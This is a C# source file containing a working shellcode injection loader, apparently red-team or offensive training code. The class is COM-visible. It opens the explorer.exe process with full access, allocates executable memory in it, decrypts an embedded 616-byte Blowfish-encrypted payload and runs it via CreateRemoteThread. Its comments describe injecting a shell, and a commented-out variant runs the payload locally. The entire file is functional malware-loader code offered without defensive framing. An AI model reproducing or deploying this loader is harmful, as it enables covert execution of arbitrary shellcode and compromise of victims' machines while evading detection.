using BlowFishDecrypt;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

[ComVisible(true)]
public class TestClass
{
    // used to inject shell into process
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    // used to inject shell into process
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    // used to inject shell into process
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    // used to inject shell into process
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // used to create new process for shell
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    // used to create new process for shell
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStarAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // used to create new process for shell
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        // used to inject shell into process
        Process[] explorer = Process.GetProcessesByName("explorer");
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorer[0].Id);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);


        byte[] buf = new byte[616] { 0x52, 0x0f, 0x54, 0xf8, 0xdb, 0xeb, 0x4c, 0xad, 0x04, 0xea, 0x03, 0x69, 0xa4, 0x6b, 0x6d, 0x9c, 0xf2, 0x03, 0x09, 0xf4, 0x09, 0x19, 0x96, 0xd5, 0x2e, 0x79, 0x8e, 0x7c, 0x7f, 0x75, 0xbd, 0x7a, 0xdd, 0x91, 0x78, 0xe1, 0x3c, 0x21, 0x21, 0xe9, 0x89, 0x70, 0x87, 0xa2, 0xca, 0xeb, 0xde, 0x31, 0x8a, 0x54, 0xfd, 0xe4, 0x5d, 0xaf, 0x20, 0x51, 0xa9, 0x1e, 0x67, 0xfa, 0xe2, 0x18, 0xf9, 0x49, 0x65, 0x3a, 0x7b, 0x66, 0x39, 0xf5, 0x2d, 0xa1, 0xf6, 0xc0, 0x4a, 0xcc, 0x27, 0x43, 0x33, 0xf5, 0x0c, 0x9a, 0x4b, 0x07, 0xf7, 0x30, 0x55, 0x5d, 0x38, 0x82, 0xa6, 0xd4, 0x88, 0x07, 0xe1, 0x0e, 0x2b, 0x46, 0xc4, 0x02, 0x27, 0x0e, 0x88, 0xea, 0x50, 0x2b, 0x42, 0xa0, 0xbd, 0xf8, 0x2c, 0xe8, 0x53, 0x44, 0x79, 0x9b, 0x1c, 0x1d, 0x8b, 0xd5, 0x3a, 0x1a, 0x87, 0x86, 0x10, 0xeb, 0xc2, 0x52, 0x06, 0xb8, 0xfd, 0xa3, 0xf4, 0x2d, 0x5b, 0x6f, 0xc4, 0x87, 0x81, 0x22, 0x15, 0x2c, 0xef, 0xe6, 0xe6, 0xb9, 0x6f, 0x60, 0xe4, 0xb4, 0xe7, 0x9c, 0x97, 0x62, 0x81, 0x36, 0xe5, 0x80, 0xcd, 0x2e, 0x95, 0x84, 0xef, 0x89, 0xd0, 0xc3, 0x74, 0x03, 0x77, 0xf4, 0xd3, 0xde, 0xe6, 0x96, 0x38, 0xc8, 0x5f, 0x63, 0x28, 0xbd, 0x8f, 0x05, 0x27, 0x39, 0x2d, 0xae, 0x1d, 0x76, 0x68, 0x1e, 0x97, 0xb3, 0x0b, 0x49, 0xba, 0xda, 0x99, 0xb8, 0xc2, 0x86, 0x56, 0x5d, 0x48, 0x26, 0xc1, 0x33, 0xd3, 0xbe, 0x7a, 0x8e, 0xb0, 0x6a, 0x7a, 0x5c, 0xf1, 0x24, 0x8a, 0x00, 0x97, 0x89, 0x04, 0x55, 0x1e, 0xc9, 0x8b, 0xe9, 0x70, 0xb6, 0x84, 0x02, 0xd4, 0x4d, 0xf8, 0x98, 0xfc, 0x1d, 0x94, 0x89, 0x91, 0x02, 0x56, 0xe6, 0xf3, 0xf5, 0x3a, 0xa0, 0xe7, 0xe8, 0x49, 0x22, 0xc8, 0xc3, 0x6f, 0x03, 0x34, 0xce, 0x2f, 0xaf, 0xd3, 0xc9, 0xda, 0x64, 0xac, 0xc4, 0x7e, 0xf0, 0xb2, 0x58, 0x05, 0x31, 0xa4, 0x0a, 0xf7, 0x8f, 0xa0, 0x6c, 0x01, 0x79, 0xbe, 0xc0, 0x0e, 0xe8, 0x46, 0x1d, 0x73, 0xa9, 0x91, 0xf2, 0x99, 0x8f, 0x43, 0x8a, 0x9e, 0x9c, 0x47, 0x59, 0xc6, 0x41, 0xc1, 0xea, 0x9b, 0x78, 0xd3, 0x39, 0x2c, 0x10, 0x7b, 0xb9, 0x18, 0x07, 0x49, 0x36, 0x56, 0xc6, 0x1a, 0x0a, 0x68, 0x05, 0x44, 0x00, 0x5d, 0xf1, 0xc5, 0xad, 0x91, 0x7e, 0x0c, 0x8c, 0x42, 0x90, 0xe3, 0x6e, 0x0d, 0x0a, 0x35, 0x3a, 0x3b, 0x03, 0xa5, 0x00, 0x81, 0xb2, 0xbb, 0xcb, 0xa7, 0x7b, 0xa4, 0x8f, 0x8f, 0xa2, 0xa9, 0xea, 0xd0, 0x10, 0xed, 0x12, 0x0d, 0xb9, 0x69, 0x31, 0xd3, 0x36, 0x57, 0x62, 0x7f, 0xbe, 0x3b, 0x0d, 0xc4, 0x69, 0xc0, 0x89, 0x0e, 0xd0, 0xa7, 0x25, 0x80, 0x97, 0x46, 0x8e, 0xef, 0xf4, 0x05, 0xc3, 0x63, 0x51, 0x7a, 0xdc, 0x0f, 0xd2, 0x5b, 0x14, 0xa2, 0x43, 0x2b, 0x4a, 0x1b, 0x90, 0x13, 0xf7, 0xe9, 0x37, 0x5e, 0x7f, 0x5e, 0xbc, 0xe1, 0xaa, 0xb1, 0x12, 0xc6, 0x76, 0x74, 0xf6, 0x1b, 0xfb, 0xe8, 0x93, 0x9a, 0x05, 0x28, 0xfd, 0xb1, 0x06, 0x66, 0xa4, 0xb4, 0xda, 0x2f, 0x31, 0x15, 0xc9, 0x71, 0x31, 0x54, 0x14, 0x75, 0x01, 0x88, 0x86, 0xe0, 0x5c, 0x0e, 0xf0, 0x9d, 0xc8, 0xe5, 0xcf, 0xce, 0xec, 0x13, 0xb8, 0xe9, 0x93, 0xb4, 0xf5, 0x4c, 0x1d, 0x9f, 0x2a, 0xe9, 0x83, 0xa5, 0x56, 0xe5, 0xed, 0x07, 0x80, 0x92, 0x71, 0xf4, 0xb7, 0xef, 0x4b, 0x42, 0x4f, 0xf6, 0xd0, 0xc9, 0x11, 0x6c, 0x7f, 0xa3, 0x80, 0xfc, 0xea, 0x1d, 0x71, 0x9d, 0xba, 0x1d, 0x1e, 0xf6, 0x17, 0xdd, 0x39, 0x61, 0x4c, 0xc8, 0xae, 0xd1, 0x15, 0x94, 0x8b, 0xe5, 0x30, 0xc9, 0x77, 0x7f, 0xca, 0x48, 0x09, 0x1d, 0xd2, 0x59, 0x38, 0xc8, 0x87, 0x21, 0x6e, 0xd6, 0xe5, 0xf9, 0xd0, 0x18, 0x5f, 0xf2, 0x57, 0xcd, 0xd5, 0x75, 0x2a, 0x78, 0xfe, 0x9a, 0xd8, 0x23, 0xa6, 0x30, 0xba, 0x74, 0x32, 0xd5, 0x49, 0xee, 0x8a, 0x2d, 0x6b, 0x51, 0x20, 0x19, 0xae, 0xc1, 0x34, 0xf0, 0x93, 0x92, 0xa4, 0x39, 0x4f, 0x8a, 0xed, 0x21, 0xdb, 0x95, 0x28, 0x11, 0x7a, 0x3c, 0x7f, 0x76, 0x2c, 0x39, 0x35, 0x53, 0x91, 0xee, 0x20, 0xc9, 0x34, 0x85, 0x27, 0xf7, 0xe6, 0xb5, 0x7e, 0x3a, 0x4a, 0x49, 0xe7, 0x56, 0x89, 0xeb, 0x0e, 0x1c, 0xb6, 0xdd, 0x91, 0x6f, 0x58, 0x86, 0xe5, 0xf4, 0xfe, 0x67, 0x21, 0x67, 0xd9, 0x64, 0xf7, 0x0e, 0x3c, 0x95, 0x15, 0x96, 0xc9 };

        BlowMe bm = new BlowMe();
        buf = bm.Decode(buf, 609);


        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        //int size = buf.Length;

        //IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        //Marshal.Copy(buf, 0, addr, size);

        //IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        //WaitForSingleObject(hThread, 0xFFFFFFFF);

    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
